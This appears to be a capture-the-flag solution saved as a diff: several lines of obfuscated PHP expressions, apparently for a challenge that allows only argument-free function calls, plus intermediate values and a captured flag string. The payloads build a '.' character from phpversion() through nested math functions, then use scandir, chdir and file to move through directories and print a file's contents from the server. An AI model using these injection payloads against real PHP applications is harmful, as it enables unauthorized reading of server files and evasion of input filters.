@@ -1,0 +1,7 @@
+echo(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion()))))))))))))))))))));
+echo(next(file(end(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion())))))))))))))))))))));
+next(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion()))))))))))))))))));
+ceil(sinh(cosh(tan(floor(sinh(cosh(1)))))))     46
+chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion()))))))))))))))))))) 1
+echo(next(file(end(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion()))))))))))))))))))))))))))))))));
+Aurora{4e5581c1-a102-4589-8881-979dfbfaff67}
